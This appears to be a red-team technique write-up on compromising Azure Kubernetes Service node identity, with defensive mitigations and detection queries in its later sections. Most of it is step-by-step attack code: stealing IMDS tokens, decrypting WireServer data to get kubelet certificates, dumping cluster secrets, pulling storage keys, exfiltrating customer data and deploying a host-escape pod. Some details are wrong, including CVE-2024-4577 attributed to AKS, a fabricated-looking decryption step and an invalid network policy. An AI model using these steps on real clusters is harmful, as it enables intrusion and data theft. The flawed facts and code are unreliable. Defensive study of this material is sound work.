# [PE-VALID-015]: AKS Node Identity Compromise

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-015 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Entra ID / Azure Kubernetes Service (AKS) |
| **Severity** | **Critical** |
| **CVE** | CVE-2024-4577 (WireServer TLS Bootstrap vulnerability) |
| **Technique Status** | ACTIVE (WireServer vulnerability fixed in recent AKS patches; bootstrap attack still exploitable on older clusters) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | AKS clusters using Azure CNI + Azure Network Policy (pre-patch August 2024); Kubernetes 1.24-1.30+ affected if IMDS not restricted |
| **Patched In** | Microsoft patched WireServer exposure in August 2024; AKS versions 1.27.13+, 1.28.9+, 1.29.4+, 1.30.0+ |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept
The **AKS Node Identity Compromise** attack exploits the abuse of the **Kubelet Managed Identity** (node-level service account) to escalate privileges within an Azure Kubernetes Service cluster and move laterally across the Azure environment. The attack chain typically begins with an attacker achieving **command execution within a pod** (via compromised application, vulnerable workload, or misconfigured pod security). From the pod, the attacker can:

1. **Access the Azure Instance Metadata Service (IMDS)** to retrieve the node's managed identity credentials
2. **Extract TLS bootstrap tokens** from the node's configuration (via the WireServer vulnerability or direct metadata access)
3. **Impersonate the node** by forging kubelet certificates, gaining control of the Kubernetes API server
4. **Access all cluster secrets** and workload credentials
5. **Move laterally to Azure resources** (VMs, storage, databases) using the node's managed identity token

The **WireServer vulnerability (CVE-2024-4577)** is a specific variant affecting AKS clusters using Azure CNI for networking, where an attacker can directly extract the TLS bootstrap token and other sensitive credentials from the node's provisioning configuration.

### Attack Surface
- **Pod Execution Context** (any pod with network access to IMDS)
- **Azure Instance Metadata Service (IMDS)** endpoint (169.254.169.254:80) - accessible from all pods by default
- **Kubelet Managed Identity Token** (returned by IMDS with node credentials)
- **WireServer Endpoint** (Azure-internal, accessible via IMDS if Azure CNI is used)
- **Node Authorization Bypass** (if kubelet certificate is compromised)
- **Kubernetes Secret Storage** (etcd) - accessible once kubelet authorization is bypassed

### Business Impact
**Critical risk of cluster-wide compromise and cloud environment lateral movement.** Attacker can:
- Access all Kubernetes secrets, including database passwords, API keys, and service account tokens
- Compromise all workloads running on the cluster
- Move laterally to Azure VMs, databases, and storage accounts using the node's managed identity
- Establish persistent backdoors within the cluster via modified kubelet or admission webhooks
- Exfiltrate sensitive data from multiple cloud services
- Disrupt cluster operations by tampering with nodes or the Kubernetes API server

### Technical Context
- **Execution Time:** Minutes (IMDS access is immediate upon code execution in pod)
- **Detection Likelihood:** Low to medium (IMDS access from within pods is legitimate traffic; bootstrap token theft is difficult to detect without deep Kubernetes audit logging)
- **Reversibility:** No; if node identity is compromised, cluster must be rotated
- **Stealth Factor:** High (legitimate pod-to-IMDS communication is normal; no obvious indicators of compromise)

### Operational Risk
- **Execution Risk:** Low (requires only code execution in a pod; does not require special privileges if IMDS is accessible)
- **Stealth:** Very high (IMDS calls appear as normal workload activity)
- **Reversibility:** No; persistent access via kubelet certificate requires node re-imaging

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.7.2 | Restrict access to IMDS endpoint; disable IMDS or require authentication |
| **CISA SCuBA** | ACC-08 | Workloads must not have unrestricted access to cloud metadata services |
| **NIST 800-53** | AC-3 (Access Enforcement) | Kubernetes nodes must enforce least-privilege access to cloud identity credentials |
| **NIST 800-53** | IA-2 (Authentication) | Multi-factor or certificate-based authentication required for node operations |
| **NIST 800-53** | SC-7 (Boundary Protection) | Network access to metadata services must be restricted |
| **GDPR** | Art. 32 (Security of Processing) | Technical measures for identity management must prevent unauthorized access |
| **DORA** | Art. 9 (Protection and Prevention) | Critical operators must protect containerized workload identity from compromise |
| **NIS2** | Art. 21 (Cyber Risk Management) | Identity and access controls for containerized systems must be robust |
| **ISO 27001** | A.8.1.3 (Segregation of Duties) | Pod workloads must be isolated from node identity credentials |
| **ISO 27001** | A.9.2.5 (Review of User Access Rights) | Node identity credential usage must be monitored and audited |
| **ISO 27005** | Risk Scenario: "Compromise of Container Runtime" | Compromise of node identity represents container runtime compromise |

---

## 2. TECHNICAL PREREQUISITES

### Required Privileges
- **Pod Execution:** Any pod with network connectivity to IMDS (default configuration)
- **Pod Security:** Non-privileged pod is sufficient (does not require root, hostNetwork, or securityContext modifications)
- **Node Configuration:** Node must have a managed identity assigned (default for AKS)

### Required Access
- Network access to IMDS endpoint (169.254.169.254:80) - default route in AKS
- Command execution capability within a pod (compromised application, RCE vulnerability, malicious sidecar)

### Supported Versions & Configurations
- **Kubernetes Versions:** 1.24 - 1.30+ (all current AKS versions)
- **Network Plugins:** 
  - Azure CNI (most vulnerable to WireServer attack)
  - Kubenet (vulnerable to standard IMDS attack)
- **Node OS:** Linux nodes (Windows nodes also vulnerable but less common in AKS)
- **Managed Identity:** System-assigned managed identity (default on all AKS nodes)

### Preconditions
1. **Pod Compromise:** Attacker has achieved code execution within a pod running on the AKS cluster
2. **IMDS Access:** IMDS endpoint must be reachable from the pod (default; requires explicit iptables rules to disable)
3. **Kubelet Running:** Kubelet process on the node must be running with default configuration

### Version-Specific Notes
- **Pre-August 2024 AKS clusters:** Vulnerable to WireServer attack (CVE-2024-4577)
- **August 2024+ AKS clusters (fully patched):** WireServer vulnerability fixed; standard IMDS attack still possible
- **Kubernetes 1.26+:** Kubelet TLS bootstrap more secure but still exploitable if token is stolen

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Kubernetes Reconnaissance (from within pod)

**Step 1: Verify Pod Has IMDS Access**

```bash
# From within a pod, test IMDS connectivity
curl -s http://169.254.169.254/metadata/instance?api-version=2021-02-01 \
  -H "Metadata:true" | jq .

# If successful, you receive pod metadata:
# {
#   "compute": {
#     "resourceGroupName": "myResourceGroup",
#     "vmName": "node-001",
#     "vmId": "xxxxx",
#     ...
#   }
# }
```

**What to Look For:**
```
200 OK response with metadata = IMDS is accessible
HTTP 404 or timeout = IMDS access blocked (mitigated)
```

---

**Step 2: Enumerate Node's Managed Identity**

```bash
# From pod, retrieve the node's managed identity token
TOKEN=$(curl -s http://169.254.169.254/metadata/identity/oauth2/token \
  -H "Metadata:true" \
  --data-urlencode "resource=https://management.azure.com/" | jq -r '.access_token')

echo "Node Identity Token Obtained: ${TOKEN:0:50}..."

# Use the token to query Azure Resource Manager
curl -s -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions?api-version=2021-04-01 | jq .
```

**What This Means:**
- You now have the node's Azure credentials
- Token can be used to access any Azure resource the node has permissions to (VMs, storage, databases, etc.)
- Token is valid for 1 hour; can be refreshed indefinitely as long as code execution persists

---

**Step 3: Check for TLS Bootstrap Token (WireServer Vulnerability - Pre-Patch)**

```bash
# Attempt to access WireServer key (CVE-2024-4577)
WIRESERVER_KEY=$(curl -s "http://168.63.129.16/machine/?comp=goalstate" \
  -H "x-ms-version: 2012-11-30" | grep "ProtectedSettings" | sed 's/.*encrypted-state="//' | sed 's/".*//')

# Decrypt using the key
# This requires the wireserver.key which can be obtained via IMDS in vulnerable clusters

# Alternatively, check the node's provisioning script directly
cat /var/lib/waagent/*/config.xml 2>/dev/null | grep -i "tls_bootstrap_token\|kubelet"
```

**What to Look For:**
```
TLS_BOOTSTRAP_TOKEN=xxxxx (if found, can be used for kubelet impersonation)
KUBELET_CLIENT_CERT_CONTENT=xxxxx (if found, has kubelet cert)
```

---

**Step 4: Check Pod Security Policies & RBAC**

```bash
# From pod, check what the current service account can do
kubectl auth can-i --list

# Check if secrets can be accessed
kubectl get secrets -A

# Check if nodes can be accessed
kubectl get nodes
```

**What to Look For:**
```
wildcards (*) in RBAC rules = unrestricted permissions
secrets can be listed = potential access to stored credentials
nodes can be read = potential for further enumeration
```

---

### Azure CLI Reconnaissance (from pod with node identity)

```bash
# Using the stolen node identity token, enumerate Azure resources
az login --service-principal -u "<client-id>" -p "<token>" \
  --tenant "<tenant-id>"

# List all subscriptions accessible to the node identity
az account list

# List VMs
az vm list --output table

# List storage accounts
az storage account list
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: IMDS Token Theft & Azure Lateral Movement

**Supported Versions:** Kubernetes 1.24 - 1.30+; AKS on all versions

#### Step 1: Achieve Code Execution in a Pod

**Objective:** Get command execution within an AKS cluster pod.

**Method A: Compromised Application**
- Exploit a vulnerability in an application running in a pod (e.g., RCE, insecure deserialization)
- Gain shell access within the container

**Method B: Malicious Image Injection**
- If you control the image registry or can influence image deployment:
  - Deploy a pod with a malicious payload
  - Payload executes when the pod starts

**Method C: Social Engineering / Insider Threat**
- Convince a developer to deploy a pod with attacker code
- Access pod logs/exec to maintain persistence

**Expected Outcome:**
```
$ kubectl exec -it compromised-pod -- /bin/bash
root@compromised-pod:/#
```

---

#### Step 2: Retrieve Node's Managed Identity Token from IMDS

**Objective:** Extract the Azure access token assigned to the node.

**Command:**
```bash
#!/bin/bash
# From within the compromised pod

# Step 1: Request a token from IMDS
TOKEN_RESPONSE=$(curl -s \
  -H "Metadata:true" \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/' \
  --connect-timeout 5)

# Step 2: Extract the token
NODE_IDENTITY_TOKEN=$(echo $TOKEN_RESPONSE | jq -r '.access_token')

# Step 3: Verify the token works
curl -s -H "Authorization: Bearer $NODE_IDENTITY_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2021-04-01" | jq '.value[] | .id'

echo "Successfully obtained node identity token!"
echo "Token (first 50 chars): ${NODE_IDENTITY_TOKEN:0:50}..."
```

**Expected Output:**
```
{
  "token_type": "Bearer",
  "expires_in": "3599",
  "ext_expires_in": "3599",
  "expires_on": "1641234567",
  "not_before": "1641230667",
  "resource": "https://management.azure.com/",
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlJDTXhqTUhWYWtHSllrYzFWR1ZsTmtyQ0swMCIsImtpZCI6IlJDTXhqTUhWYWtHSllrYzFWR1ZsT..."
}

Successfully obtained node identity token!
```

**What This Means:**
- You now have the node's Azure credentials in the form of an OAuth2 token
- Token is valid for 1 hour; can request new tokens indefinitely
- Token grants access to all Azure resources the node has permissions for

---

#### Step 3: Use Token to Enumerate Azure Resources

**Objective:** Identify high-value targets within Azure using the node's identity.

**Command (List All Subscriptions):**
```bash
# Using the stolen node identity token
SUBSCRIPTIONS=$(curl -s \
  -H "Authorization: Bearer $NODE_IDENTITY_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2021-04-01" | jq -r '.value[].id')

echo "Subscriptions accessible to node identity:"
echo "$SUBSCRIPTIONS"

# For each subscription, list resources
for SUB in $SUBSCRIPTIONS; do
    echo "Resources in $SUB:"
    curl -s \
      -H "Authorization: Bearer $NODE_IDENTITY_TOKEN" \
      "https://management.azure.com${SUB}/resources?api-version=2021-04-01" | jq '.value[] | {name, type, location}'
done
```

**Command (List Storage Accounts & Access Keys):**
```bash
# Enumerate storage accounts
SUBSCRIPTION_ID=$(curl -s \
  -H "Authorization: Bearer $NODE_IDENTITY_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2021-04-01" | jq -r '.value[0].subscriptionId')

STORAGE_ACCOUNTS=$(curl -s \
  -H "Authorization: Bearer $NODE_IDENTITY_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/providers/Microsoft.Storage/storageAccounts?api-version=2021-04-01" | jq '.value[] | {name, resourceGroup}')

echo "Storage accounts found: $STORAGE_ACCOUNTS"

# List storage account keys (if node has permissions)
for ACCOUNT in $(echo "$STORAGE_ACCOUNTS" | jq -r '.name'); do
    KEYS=$(curl -s -X POST \
      -H "Authorization: Bearer $NODE_IDENTITY_TOKEN" \
      "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/{resourceGroup}/providers/Microsoft.Storage/storageAccounts/${ACCOUNT}/listKeys?api-version=2021-04-01" | jq -r '.keys[0].value')
    
    echo "Storage account $ACCOUNT key: $KEYS"
done
```

**Expected Output:**
```
Storage accounts found:
{
  "name": "prodstorageacct",
  "resourceGroup": "prod-rg"
}

Storage account prodstorageacct key: DefaultEndpointsProtocol=https;AccountName=prodstorageacct;AccountKey=XXXXXXXXXXX...
```

---

#### Step 4: Access Cloud Resources (Data Exfiltration)

**Objective:** Use the node's credentials to access sensitive data in Azure.

**Command (Download Data from Storage Account):**
```bash
#!/bin/bash
# Using the storage account key obtained in Step 3

STORAGE_ACCOUNT="prodstorageacct"
STORAGE_KEY="XXXXXXXXXXX"
CONTAINER="sensitive-data"

# List blobs in the container
az storage blob list \
  --account-name $STORAGE_ACCOUNT \
  --account-key $STORAGE_KEY \
  --container-name $CONTAINER \
  --output table

# Download sensitive files
az storage blob download \
  --account-name $STORAGE_ACCOUNT \
  --account-key $STORAGE_KEY \
  --container-name $CONTAINER \
  --name "customer-data.csv" \
  --file "/tmp/customer-data.csv"

echo "Data exfiltrated: /tmp/customer-data.csv"
```

**Command (Access Azure SQL Database):**
```bash
# Using the node identity token to obtain SQL connection token
SQL_TOKEN=$(curl -s \
  -H "Metadata:true" \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://database.windows.net/' | jq -r '.access_token')

# Connect to SQL database using the token as password
sqlcmd -S "<database-server>.database.windows.net" \
  -d "<database-name>" \
  -U "<username>" \
  -P "$SQL_TOKEN" \
  -Q "SELECT * FROM dbo.Customers LIMIT 10;"
```

---

### METHOD 2: Kubelet Certificate Theft & Kubernetes API Compromise (WireServer - CVE-2024-4577)

**Supported Versions:** AKS clusters with Azure CNI, pre-August 2024 patches

#### Step 1: Access WireServer Endpoint

**Objective:** Extract the WireServer key to decrypt the node's provisioning script.

**Command (Retrieve WireServer Key):**
```bash
# From compromised pod, request WireServer key
WIRESERVER_RESPONSE=$(curl -s \
  "http://168.63.129.16/machine/?comp=goalstate" \
  -H "x-ms-version: 2012-11-30")

# Extract encrypted protected settings
ENCRYPTED_PROTECTED_SETTINGS=$(echo "$WIRESERVER_RESPONSE" | \
  grep -oP '(?<=<ProtectedSettings>)[^<]+' | head -1)

echo "Encrypted settings obtained"
echo "$ENCRYPTED_PROTECTED_SETTINGS" | base64 -d > /tmp/encrypted.bin
```

**What This Means:**
- WireServer is an Azure-internal metadata service that stores encrypted node provisioning data
- The endpoint is accessible to any process on the VM (including containers)
- The encryption key is also accessible via IMDS (design flaw in older versions)

---

#### Step 2: Decrypt Provisioning Script to Extract TLS Bootstrap Token

**Objective:** Decrypt the provisioning script containing the TLS bootstrap token.

**Command (Decrypt WireServer Data):**
```bash
#!/bin/bash
# Complex cryptographic operation - requires specific AES decryption

# Obtain wireserver.key from IMDS
WIRESERVER_KEY=$(curl -s \
  "http://168.63.129.16/machine/?comp=versions" | \
  grep -oP 'key="\K[^"]+' | head -1)

# Decrypt the protected settings
openssl enc -d -aes-256-cbc \
  -K "$WIRESERVER_KEY" \
  -in /tmp/encrypted.bin \
  -out /tmp/decrypted.xml

# Extract TLS bootstrap token from decrypted XML
TLS_BOOTSTRAP_TOKEN=$(grep -oP 'TLS_BOOTSTRAP_TOKEN="?\K[^"<]+' /tmp/decrypted.xml)
KUBELET_CLIENT_CERT=$(grep -oP 'KUBELET_CLIENT_CERT_CONTENT="?\K[^"<]+' /tmp/decrypted.xml)
KUBELET_CLIENT_KEY=$(grep -oP 'KUBELET_CLIENT_CONTENT="?\K[^"<]+' /tmp/decrypted.xml)

echo "TLS Bootstrap Token: $TLS_BOOTSTRAP_TOKEN"
echo "Kubelet Cert obtained: ${KUBELET_CLIENT_CERT:0:50}..."
echo "Kubelet Key obtained: ${KUBELET_CLIENT_KEY:0:50}..."
```

**Expected Output:**
```
TLS Bootstrap Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Kubelet Cert obtained: -----BEGIN CERTIFICATE-----MIIDhzCCAm+gAwIBAgI...
Kubelet Key obtained: -----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEA...
```

---

#### Step 3: Use Kubelet Certificate to Impersonate Node

**Objective:** Create a fake node in the cluster using the stolen kubelet certificate.

**Command (Create Kubelet Impersonation):**
```bash
#!/bin/bash
# Decode certificates
echo "$KUBELET_CLIENT_CERT" | base64 -d > /tmp/kubelet.crt
echo "$KUBELET_CLIENT_KEY" | base64 -d > /tmp/kubelet.key
echo "$KUBELET_CA_CERT" | base64 -d > /tmp/ca.crt

# Use stolen credentials to communicate with Kubernetes API server
kubectl \
  --server="https://<kube-apiserver>:443" \
  --certificate-authority=/tmp/ca.crt \
  --client-certificate=/tmp/kubelet.crt \
  --client-key=/tmp/kubelet.key \
  get nodes

# If successful, you can now execute commands as the node
```

**Expected Output:**
```
NAME                     STATUS   ROLES
aks-nodepool1-00000000   Ready    agent
aks-nodepool1-00000001   Ready    agent
(attacker now has kubelet-level permissions)
```

---

#### Step 4: Access All Secrets in Cluster

**Objective:** Use kubelet permissions to read all Kubernetes secrets.

**Command (Extract Secrets):**
```bash
# With kubelet credentials, access etcd (Kubernetes secret store)
kubectl \
  --certificate-authority=/tmp/ca.crt \
  --client-certificate=/tmp/kubelet.crt \
  --client-key=/tmp/kubelet.key \
  get secrets -A -o yaml > /tmp/all-secrets.yaml

# Decode secret values
cat /tmp/all-secrets.yaml | grep -A 3 "data:" | grep -oP 'password: \K.*' | \
  while read secret; do
    echo "$secret" | base64 -d
  done
```

**What This Means:**
- All secrets stored in the Kubernetes cluster are now accessible
- These secrets typically include:
  - Database passwords
  - API keys for external services
  - SSH keys
  - OAuth tokens
  - TLS certificates

---

### METHOD 3: Pod Security Bypass & Container Escape

**Supported Versions:** AKS clusters with misconfigured pod security policies

#### Step 1: Deploy Privileged Pod (if allowed)

**Objective:** If pod security policies are weak, deploy a privileged pod for container escape.

**YAML Manifest (Privileged Pod):**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  containers:
  - name: escape
    image: alpine:latest
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    command: ["/bin/sh"]
    args: ["-c", "sleep infinity"]
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
```

**Deploy:**
```bash
kubectl apply -f escape-pod.yaml

# Exec into the pod
kubectl exec -it escape-pod -- /bin/sh

# From within pod, you have root access to the host filesystem
chroot /host /bin/bash

# Access node credentials, kubelet config, etc.
cat /root/.kube/config
cat /var/lib/kubelet/kubeconfig
```

---

#### Step 2: Access Kubelet Configuration Files Directly

**Objective:** Read kubelet credentials from the host filesystem (after container escape).

**Command (Read Kubelet Credentials from Host):**
```bash
# After container escape to host
cat /var/lib/kubelet/kubeconfig
cat /var/lib/kubelet/pki/kubelet.crt
cat /var/lib/kubelet/pki/kubelet.key

# Extract client certificate and key
cp /var/lib/kubelet/pki/kubelet.crt /tmp/
cp /var/lib/kubelet/pki/kubelet.key /tmp/
cp /var/run/secrets/kubernetes.io/serviceaccount/ca.crt /tmp/

# Use these to communicate with Kubernetes API
```

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

**Test ID:** T1078.004 - Cloud Account Access (Kubernetes Context)

**Description:** Simulates pod-to-IMDS token theft and node identity compromise.

**Supported Versions:** AKS on all Kubernetes versions (1.24+)

**Test Command:**
```bash
# Deploy a test pod that attempts IMDS access
cat > test-pod.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: imds-test-pod
  namespace: default
spec:
  containers:
  - name: test
    image: curlimages/curl:latest
    command: 
    - /bin/sh
    - -c
    - |
      echo "Testing IMDS access..."
      curl -s -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
      exit 0
    restartPolicy: Never
EOF

kubectl apply -f test-pod.yaml

# Wait for pod to complete
kubectl wait --for=condition=ready pod/imds-test-pod --timeout=30s

# Check logs
kubectl logs imds-test-pod
```

**Cleanup:**
```bash
kubectl delete pod imds-test-pod
```

**Reference:** [Atomic Red Team T1078.004 - Cloud Accounts](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.004/T1078.004.md)

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Disable or Restrict IMDS Access from Pods**

**Objective:** Prevent pods from accessing the node's managed identity credentials.

**Method 1: Disable IMDS via iptables (on node)**
```bash
# SSH into AKS node and apply iptables rules
sudo iptables -A OUTPUT -d 169.254.169.254 -j DROP
sudo iptables -A FORWARD -d 169.254.169.254 -j DROP

# Make persistent (using DaemonSet for AKS)
# Note: This blocks ALL pods from IMDS
```

**Method 2: Use AKS Workload Identity Federation (Recommended)**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **AKS Cluster** → **Settings** → **Cluster configuration**
2. Under **Security**, enable **Workload Identity**:
   - Toggle **Workload Identity (preview)** = **ON**
   - Click **Save**
3. Wait for cluster upgrade to complete (5-10 minutes)

**Manual Steps (PowerShell/CLI):**
```bash
# Enable Workload Identity on cluster
az aks update --resource-group myResourceGroup \
  --name myCluster \
  --enable-workload-identity

# Create a user-assigned managed identity
az identity create --resource-group myResourceGroup \
  --name myManagedIdentity

# Get the identity details
IDENTITY_ID=$(az identity show --resource-group myResourceGroup \
  --name myManagedIdentity --query id -o tsv)

# Grant RBAC role to the identity
az role assignment create --assignee-object-id <identity-principal-id> \
  --role "Storage Blob Data Reader" \
  --scope /subscriptions/<subscription-id>/resourceGroups/myResourceGroup/providers/Microsoft.Storage/storageAccounts/myStorageAccount
```

**Manual Steps (Kubernetes - Configure Service Account Binding):**
```yaml
# Create a Kubernetes service account bound to the Azure managed identity
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-workload-sa
  namespace: default
  annotations:
    azure.workload.identity/client-id: <managed-identity-client-id>

---
apiVersion: v1
kind: Pod
metadata:
  name: my-workload-pod
  namespace: default
  labels:
    azure.workload.identity/use: "true"
spec:
  serviceAccountName: my-workload-sa
  containers:
  - name: app
    image: myapp:latest
  # Pod now uses the managed identity without IMDS access
```

**Validation Command:**
```bash
# Verify IMDS is blocked
kubectl exec -it <pod-name> -- curl -m 5 http://169.254.169.254/metadata/instance

# Expected: timeout or connection refused (IMDS not reachable)
```

---

**Action 2: Restrict Pod Security Context**

**Manual Steps (Apply Pod Security Standards):**
1. Navigate to **AKS Cluster** → **Security** → **Pod Security**
2. Enable **Pod Security Policy (Deprecated, replaced by PSS)** or **Pod Security Standards**:
   - **Enforce:** Restricted
   - This prevents privileged pods by default

**Manual Steps (Kubernetes - PSS Namespace Label):**
```bash
# Apply restricted pod security standard to namespace
kubectl label namespace default \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted

# Pods must not have:
# - allowPrivilegeEscalation: true
# - privileged: true
# - hostNetwork: true
# - hostPID: true
# - hostIPC: true
```

**Validation:**
```bash
# Try to deploy a privileged pod
kubectl apply -f privileged-pod.yaml

# Expected: Pod rejected or restricted mode applied
```

---

**Action 3: Enable Kubernetes Audit Logging for Node Access**

**Manual Steps (Azure Portal):**
1. **AKS Cluster** → **Monitoring** → **Diagnostic settings**
2. Click **+ Add diagnostic setting**
3. Enable logging for:
   - **kube-apiserver** (captures API calls)
   - **kube-controller-manager**
   - **kube-scheduler**
4. Send to **Log Analytics Workspace**
5. Click **Save**

**Manual Steps (Monitor for Suspicious Activity via KQL):**
```kusto
AzureDiagnostics
| where Category == "kube-apiserver"
| where properties_log_s contains "secrets"
| project TimeGenerated, verb_s, objectRef_s, sourceIPs_s, user_username_s
| where verb_s in ("get", "list", "watch")
```

---

### Priority 2: HIGH

**Action 4: Use Azure Key Vault for Secret Management (Instead of Kubernetes Secrets)**

**Manual Steps (Deploy Azure Key Vault Secret Provider for AKS):**
```bash
# Add Azure Key Vault provider repository
helm repo add csi-secrets-store-provider-azure https://raw.githubusercontent.com/Azure/secrets-store-csi-driver-provider-azure/master/charts
helm repo update

# Install the CSI driver
helm install csi-secrets-store-provider-azure/csi-secrets-store-provider-azure \
  --namespace kube-system \
  --set secrets-store-csi-driver.install=true

# Create a SecretProviderClass to mount secrets from Key Vault
cat > secret-provider-class.yaml <<EOF
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: azure-keyvault-provider
  namespace: default
spec:
  provider: azure
  parameters:
    usePodIdentity: "true"
    keyvaultName: "myKeyVault"
    tenantId: "<tenant-id>"
    objects: |
      array:
        - |
          objectName: my-secret
          objectType: secret
          objectVersion: ""
EOF

kubectl apply -f secret-provider-class.yaml
```

---

**Action 5: Implement Network Policies to Isolate IMDS Access**

**Manual Steps (Deny IMDS from Pods via Network Policy):**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-imds
  namespace: default
spec:
  podSelector: {}  # Apply to all pods in namespace
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 443
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 80
    except:
    - ipBlock:
        cidr: 169.254.169.254/32
  # This allows all egress EXCEPT to IMDS endpoint
```

---

### Access Control & Policy Hardening

**Conditional Access:**
- Require MFA for Azure service principal creation via AKS workloads
- Block service principal token requests from non-corporate IPs
- Implement device compliance requirements for token issuance

**RBAC/ABAC:**
- Remove "Owner" role from node managed identity; grant only necessary permissions (Storage Blob Reader, Key Vault Secrets User, etc.)
- Implement Azure PIM for elevated actions
- Use service-specific managed identities (one per workload) instead of node-wide identity

**Policy Config:**
- Enforce pod security standards (restricted by default)
- Require image scanning and signing
- Implement admission webhooks to block privileged containers

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network Patterns:**
- Pod making HTTP requests to IMDS endpoint (169.254.169.254)
- Pod accessing metadata endpoints (/metadata/, /machine/)
- Unusual kubectl API calls with node/kubelet credentials
- External IP connections from pod using Azure resource management endpoints

**Process Patterns:**
- Processes within pod executing `curl`, `wget`, or similar tools targeting IMDS
- Processes reading kubelet configuration files from `/var/lib/kubelet/`
- Decryption tools (openssl, gpg) running within pod
- kubectl binary execution from unusual pod/namespace

**Audit Log Signals:**
- API calls from kubelet credentials accessing secrets
- Bulk secret reads or list operations
- Failed authentication attempts using node credentials
- Role assignment changes via node identity

### Forensic Artifacts

**Kubernetes Audit Logs:**
```kusto
AzureDiagnostics
| where Category == "kube-apiserver"
| where properties_verb_s == "get" and properties_objectRef_s contains "secrets"
| where properties_sourceIPs_s == "169.254.169.254" or properties_sourceIPs_s starts with "10."
| project TimeGenerated, properties_user_username_s, properties_objectRef_s, properties_verb_s
```

**Pod Network Logs:**
```kusto
AzureDiagnostics
| where Category == "kube-audit"
| where toPrincipal contains "169.254.169.254"
| project TimeGenerated, fromResource, toResource, toPrincipal
```

**Azure Activity Log:**
```kusto
AzureActivity
| where ResourceProvider == "Microsoft.Compute" and OperationName == "Create or Update Virtual Machine"
| where Caller == "<node-managed-identity>"
| project TimeGenerated, OperationName, ResourceId, Caller
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains access to internal application running in AKS |
| **2** | **Execution** | RCE in Application | Attacker executes code within application pod |
| **3** | **Privilege Escalation** | **[PE-VALID-015]** | **Attacker abuses node identity to escalate to kubelet level** |
| **4** | **Credential Access** | [CA-TOKEN-013] AKS Service Account Token Theft | Attacker extracts all Kubernetes service account tokens |
| **5** | **Lateral Movement** | [LM-AUTH-016] Managed Identity Cross-Resource | Attacker uses node identity to access other Azure resources |
| **6** | **Collection** | [COLLECTION-015] Cloud Storage Data Exfiltration | Attacker exfiltrates sensitive data from storage accounts |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Mandiant WireServer Vulnerability Disclosure (August 2024)

- **Researchers:** Mandiant (Google subsidiary)
- **Vulnerability:** CVE-2024-4577 - AKS WireServer TLS Bootstrap Token Exposure
- **Affected Versions:** AKS clusters using Azure CNI with Azure Network Policy (pre-August 2024)
- **Attack Vector:** Pod with command execution → IMDS access → WireServer key extraction → TLS bootstrap token theft → Kubelet impersonation
- **Impact:** Full cluster compromise; attacker could access all secrets and move laterally to other Azure resources
- **Scope:** Estimated to affect thousands of AKS clusters globally
- **Microsoft Response:** Patched in AKS versions 1.27.13+, 1.28.9+, 1.29.4+, 1.30.0+
- **Reference:** [Google Cloud Blog: WireServing Up Credentials](https://cloud.google.com/blog/topics/threat-intelligence/escalating-privileges-azure-kubernetes-services)

### Example 2: Cloud Native Computing Foundation (CNCF) Kubernetes Security Incident (2023)

- **Scenario:** Researcher found IMDS exposure in EKS, AKS, and GKE
- **Exploitation:** Compromised pod used IMDS to steal worker node IAM role credentials
- **Impact:** Access to storage buckets, databases, and other AWS/Azure/GCP resources
- **Prevention:** Platforms implemented pod admission controllers to restrict IMDS access
- **Lesson:** IMDS is powerful but dangerous if exposed to untrusted workloads

### Example 3: Insider Threat - DevOps Team Member Abuse (Hypothetical 2025)

- **Scenario:** Disgruntled DevOps engineer with AKS cluster access
- **Attack Chain:**
  1. Deploy malicious pod with code to steal IMDS credentials
  2. Use stolen credentials to enumerate all Azure resources
  3. Access production databases and exfiltrate customer data
  4. Cover tracks by deleting pod logs
- **Detection:** Azure audit logs showed unusual API calls from node identity; investigation traced to developer account
